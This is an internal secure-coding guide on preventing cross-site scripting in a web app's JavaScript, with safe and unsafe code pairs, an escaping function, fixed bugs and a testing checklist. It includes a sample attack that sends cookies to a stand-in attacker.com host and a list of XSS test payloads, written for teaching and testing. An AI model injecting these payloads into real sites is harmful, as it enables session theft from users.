# SECURITY GUIDELINES - XSS PREVENTION

**Last Updated**: 2025-11-14
**Scope**: Cross-Site Scripting (XSS) attack prevention
**Applies To**: All frontend JavaScript code

---

## RULE #1: ALWAYS ESCAPE USER INPUT IN innerHTML

When using `innerHTML` with user-generated content, **ALWAYS** call `escapeHtml()`:

### ✅ SAFE Examples

```javascript
// Example 1: Form input
const userName = escapeHtml(inputElement.value);
element.innerHTML = `<div>Hello, ${userName}!</div>`;

// Example 2: Database content
const customerName = escapeHtml(customer.CustomerName);
html += `<td>${customerName}</td>`;

// Example 3: API response
const message = escapeHtml(response.Message);
container.innerHTML = `<p>${message}</p>`;
```

### ❌ UNSAFE Examples (XSS VULNERABILITIES!)

```javascript
// Example 1: NEVER insert user input directly
element.innerHTML = `<div>Hello, ${inputElement.value}!</div>`;  // ❌ XSS!

// Example 2: Database content can be malicious
html += `<td>${customer.CustomerName}</td>`;  // ❌ XSS!

// Example 3: API responses can be compromised
container.innerHTML = `<p>${response.Message}</p>`;  // ❌ XSS!
```

---

## RULE #2: PREFER innerText OVER innerHTML

When you don't need HTML formatting, use `innerText` or `textContent`:

### ✅ SAFE Examples (Automatically Escapes)

```javascript
// Example 1: Plain text display
element.innerText = user.name;  // ✅ SAFE

// Example 2: Error messages
errorElement.textContent = errorMessage;  // ✅ SAFE

// Example 3: Modal popups (already uses innerText in ui.js)
titleElement.innerText = title;  // ✅ SAFE
```

### ❌ UNNECESSARY innerHTML Usage

```javascript
// Example 1: No HTML needed - use innerText instead
element.innerHTML = escapeHtml(user.name);  // ❌ Unnecessary escaping

// Better approach:
element.innerText = user.name;  // ✅ Simpler and safer
```

---

## RULE #3: NEVER TRUST USER INPUT

**ALL user input is potentially malicious**. This includes:

- ✅ Form field values (text inputs, textareas, etc.)
- ✅ URL query parameters (e.g., `?customerId=<script>...`)
- ✅ Database content (could be compromised via SQL injection or malicious user)
- ✅ API responses from backend (could be MITM attacked)
- ✅ LocalStorage/SessionStorage (could be modified by malicious scripts)
- ✅ Cookies (could be modified)

**Sources to ALWAYS escape**:
- User typed text (form inputs)
- Database records (CustomerName, InvoiceNumber, etc.)
- Backend API responses
- URL parameters
- Any content from external sources

**Sources SAFE to use without escaping**:
- ❌ Hardcoded strings in your JavaScript code
- ❌ Constants defined in code
- ❌ Math calculations (e.g., `${total + tax}`)

---

## RULE #4: ESCAPE BEFORE INSERTING, NOT AFTER

Always escape content **BEFORE** inserting it into innerHTML:

### ✅ CORRECT Order

```javascript
// STEP 1: Escape FIRST
const safeName = escapeHtml(customer.CustomerName);

// STEP 2: Highlight or format (works on escaped content)
if (query) {
    const safeQuery = escapeHtml(query);
    safeName = safeName.replace(new RegExp(safeQuery, 'gi'), '<mark>$&</mark>');
}

// STEP 3: Insert into innerHTML
html += `<div>${safeName}</div>`;  // ✅ SAFE
```

### ❌ INCORRECT Order

```javascript
// STEP 1: Highlight FIRST (on unescaped content)
let name = customer.CustomerName;
if (query) {
    name = name.replace(new RegExp(query, 'gi'), '<mark>$&</mark>');
}

// STEP 2: Insert into innerHTML (NO ESCAPING!)
html += `<div>${name}</div>`;  // ❌ XSS VULNERABILITY!
```

---

## WHAT IS XSS (Cross-Site Scripting)?

XSS allows attackers to inject malicious JavaScript into web pages viewed by other users.

### Attack Example

**Attacker Action**:
```javascript
// Attacker creates customer with malicious name:
CustomerName = '<script>
    fetch("https://attacker.com/steal?cookie=" + document.cookie);
</script>';
```

**Victim Action**:
```javascript
// Victim searches for customer
// Frontend displays customer name WITHOUT escaping:
html += `<div>${customer.CustomerName}</div>`;
dropdown.innerHTML = html;
```

**Result**:
- Script executes in victim's browser
- Attacker receives victim's session cookie
- Attacker can impersonate victim

---

## COMMON XSS PAYLOADS TO TEST

Always test your code with these payloads:

### Payload 1: Basic Script Tag
```html
<script>alert('XSS')</script>
```

### Payload 2: Event Handler
```html
<img src=x onerror=alert('XSS')>
```

### Payload 3: SVG Event
```html
<svg onload=alert('XSS')>
```

### Payload 4: iframe JavaScript
```html
<iframe src="javascript:alert('XSS')"></iframe>
```

### Payload 5: Attribute Injection
```html
" onload="alert('XSS')
```

### Expected Result After Escaping

All payloads should:
- ✅ Display as plain text (visible characters)
- ✅ NOT execute JavaScript
- ✅ NOT show alert popups
- ✅ Show escaped HTML entities (e.g., `&lt;script&gt;`)

---

## HOW escapeHtml() WORKS

### Implementation

```javascript
const escapeHtml = (text) => {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
};
```

### Character Mapping

| Character | Escaped To | Why Critical |
|-----------|------------|--------------|
| `&` | `&amp;` | Prevents entity injection |
| `<` | `&lt;` | Prevents tag opening (`<script>`) |
| `>` | `&gt;` | Prevents tag closing |
| `"` | `&quot;` | Prevents attribute injection (double quotes) |
| `'` | `&#039;` | Prevents attribute injection (single quotes) |

### Example Transformation

**Input**:
```javascript
const malicious = '<script>alert("XSS")</script>';
```

**After escapeHtml()**:
```javascript
const safe = '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;';
```

**Displayed in Browser**:
```
<script>alert("XSS")</script>
```
(Shown as text, NOT executed)

---

## CODE REVIEW CHECKLIST

Before committing code, verify:

- [ ] All `innerHTML =` assignments escape user input with `escapeHtml()`
- [ ] All `.innerHTML +=` operations escape user input
- [ ] Database content (CustomerName, InvoiceNumber, etc.) is escaped before innerHTML
- [ ] Form input values are escaped before innerHTML
- [ ] API response data is escaped before innerHTML
- [ ] Alternatively, use `innerText` or `textContent` instead of `innerHTML`
- [ ] Test with XSS payloads (`<script>`, `<img onerror>`, etc.)
- [ ] Verify no alert popups or script execution with test payloads

---

## WHEN TO USE EACH APPROACH

### Use escapeHtml() + innerHTML when:
- You need to preserve HTML formatting (`<strong>`, `<em>`, `<mark>`, etc.)
- You're building complex HTML structures (tables, lists, etc.)
- You're highlighting search terms with `<mark>` tags

### Use innerText/textContent when:
- You're displaying plain text only
- You don't need any HTML formatting
- You're showing error messages in modals
- It's simpler and safer

---

## REAL-WORLD VULNERABILITIES FIXED

### Vulnerability #1: Customer Filter Message (FIXED)

**Before** (invoices.js:381):
```javascript
const customerName = displayInput?.value || 'questo cliente';  // ❌ NOT ESCAPED
noResultsMessage = `Nessuna fattura trovata per <strong>${customerName}</strong>.`;
container.innerHTML = noResultsMessage;  // ❌ XSS!
```

**After** (FIXED):
```javascript
const customerName = escapeHtml(displayInput?.value || 'questo cliente');  // ✅ ESCAPED
noResultsMessage = `Nessuna fattura trovata per <strong>${customerName}</strong>.`;
container.innerHTML = noResultsMessage;  // ✅ SAFE
```

---

### Vulnerability #2: Autocomplete Dropdown (FIXED)

**Before** (autocomplete-utils.js:553-558):
```javascript
let displayName = customer.CustomerName;  // ❌ NOT ESCAPED
if (query) {
    const regex = new RegExp(`(${query})`, 'gi');  // ❌ QUERY NOT ESCAPED
    displayName = customer.CustomerName.replace(regex, '<mark>$1</mark>');
}
html += `<div>${displayName}</div>`;  // ❌ XSS!
```

**After** (FIXED):
```javascript
let displayName = escapeHtml(customer.CustomerName);  // ✅ ESCAPED FIRST
if (query) {
    const escapedQuery = escapeHtml(query);  // ✅ QUERY ESCAPED
    const safeQuery = escapedQuery.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');  // ✅ REGEX SAFE
    const regex = new RegExp(`(${safeQuery})`, 'gi');
    displayName = displayName.replace(regex, '<mark>$1</mark>');
}
html += `<div>${displayName}</div>`;  // ✅ SAFE
```

---

## TESTING FOR XSS

### Manual Testing Steps

1. **Identify user input points**:
   - Form fields
   - Search boxes
   - Filters
   - URL parameters

2. **Inject XSS payloads**:
   - Type `<script>alert('XSS')</script>` in each field
   - Type `<img src=x onerror=alert('XSS')>` in each field

3. **Verify protection**:
   - No alert popups should appear
   - Payloads should display as plain text
   - Console should show no errors

4. **Test edge cases**:
   - Special characters: `', ", &, <, >`
   - Unicode characters: `À, È, Ò`
   - Empty strings
   - Very long strings

---

## ADDITIONAL SECURITY MEASURES

### Defense in Depth

1. **Content Security Policy (CSP)** (Backend - future enhancement):
   ```
   Content-Security-Policy: script-src 'self'
   ```
   Prevents inline scripts even if XSS bypasses escaping

2. **HTTPOnly Cookies** (Backend - already implemented):
   ```
   Set-Cookie: sessionId=...; HttpOnly
   ```
   Prevents JavaScript from accessing cookies

3. **Input Validation** (Backend):
   - Reject obviously malicious input
   - Limit length of input fields
   - Whitelist allowed characters

4. **Output Encoding** (Frontend - implemented):
   - Always escape user input before display
   - Use escapeHtml() for innerHTML
   - Use innerText for plain text

---

## REFERENCES

- **OWASP XSS Prevention Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- **OWASP Top 10 2021 - A03:Injection**: https://owasp.org/Top10/A03_2021-Injection/
- **CWE-79**: https://cwe.mitre.org/data/definitions/79.html
- **MDN - innerHTML**: https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations

---

## QUICK REFERENCE CARD

### ✅ DO

- `element.innerHTML = escapeHtml(userInput);`
- `element.innerText = userInput;`
- `element.textContent = userInput;`
- Escape ALL user input (form fields, database, API)
- Test with XSS payloads
- Review code for innerHTML without escaping

### ❌ DON'T

- `element.innerHTML = userInput;`  ← XSS!
- `element.innerHTML = customer.name;`  ← XSS!
- `element.innerHTML = response.data;`  ← XSS!
- Trust user input
- Trust database content without escaping
- Skip XSS testing

---

**REMEMBER**: When in doubt, use `innerText` instead of `innerHTML`!

---

**END OF SECURITY GUIDELINES**

**Last Updated**: 2025-11-14
**Next Review**: When adding new frontend features involving user input

---
